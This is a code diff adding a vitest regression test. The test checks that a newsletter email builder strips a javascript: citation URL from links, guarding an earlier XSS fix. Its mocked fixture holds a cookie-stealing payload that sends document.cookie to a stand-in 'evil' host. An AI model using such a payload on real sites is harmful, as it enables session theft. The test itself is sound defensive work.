@@ -7,7 +7,7 @@
  * "POST /subscribe" / "GET /api/confirm" conventions for the HTTP surface.
  */
 import { env, SELF } from "cloudflare:test";
-import { describe, expect, it } from "vitest";
+import { describe, expect, it, vi } from "vitest";
 import * as store from "../src/store";
 import { runComplianceNewsletterPass } from "../src/scheduler";
 import { buildNewsletterDigestEmail } from "../src/emails";
@@ -269,5 +269,69 @@ describe("runComplianceNewsletterPass() -- cadence + content-safety gating", () 
     expect(summary.sent).toBe(0);
     const after = await store.getNewsletterDigestState(env.DB);
     expect(after.last_sent_at).toBe(before.last_sent_at);
+  });
+});
+
+// TEST-11 (AuditLab, 2026-09-19): XSS-3's fix (scheduler.ts:2280 wrapping
+// citationUrl in safeHttpUrl(), matching the guard its own sibling at
+// :1012 already applies) shipped with no test that would fail if that
+// wrap were reverted -- every real reg_change_events.json citation_url is
+// already https, so nothing in the suite exercises the guard itself.
+// Injects a real (mocked) event with a javascript: citation_url through
+// the actual send pipeline and checks the built email's raw HTML never
+// contains it as an href -- the same live sink AuditLab traced this to
+// (emails.ts:2978's `<a href="${esc(it.citationUrl)}"...>`, where esc()
+// is explicitly NOT the scheme guard per generate.py:553's own comment).
+describe("XSS-3 regression -- newsletter citationUrl scheme guard is load-bearing", () => {
+  it("runComplianceNewsletterPass never emits a javascript: href for a malicious citation_url", async () => {
+    vi.resetModules();
+    vi.doMock("../src/reg_change_events.json", () => ({
+      default: {
+        events: [
+          {
+            event_id: "xx-regwatch-test11",
+            jurisdiction_slug: "xx-test-state",
+            jurisdiction: "Test State",
+            topic: "CPA regulatory/statutory change",
+            citation: "Test Code s 1",
+            citation_url: "javascript:fetch('https://evil/'+document.cookie)",
+            secondary_url: null,
+            verified_date: "2026-01-01",
+            confidence: "dual_source",
+            summary_public: "A test-only synthetic event for TEST-11's scheme-guard regression check.",
+            kind: "rule_change",
+            effective_date: "2099-01-01",
+            status: "ENACTED",
+            status_evidence: "fixture",
+            status_source_url: "https://example.gov/x",
+            upcoming: true,
+            needs_reverification: false,
+            source: "difflab_reg_change_engine",
+          },
+        ],
+      },
+    }));
+    const { runComplianceNewsletterPass: runComplianceNewsletterPassMocked } = await import("../src/scheduler");
+    const storeMocked = await import("../src/store");
+
+    const email = `newsletter-test11-${Date.now()}@example.com`;
+    await postNewsletterSubscribe(email, "203.0.113.214");
+    const row = await env.DB.prepare("SELECT * FROM newsletter_subscribers WHERE email = ?1").bind(email).first<NewsletterRow>();
+    await storeMocked.confirmNewsletterSubscriberIfPending(env.DB, row!.confirm_token);
+    await seedDigestState(40, []); // due, no events excluded yet
+
+    let builtHtml = "";
+    const summary = await runComplianceNewsletterPassMocked(env, {
+      send: async (_to, built) => {
+        builtHtml = built.htmlBody;
+        return true;
+      },
+    });
+    expect(summary.sent).toBeGreaterThan(0);
+    expect(builtHtml).not.toContain("javascript:");
+    expect(builtHtml).toContain("Test State");
+
+    vi.doUnmock("../src/reg_change_events.json");
+    vi.resetModules();
   });
 });
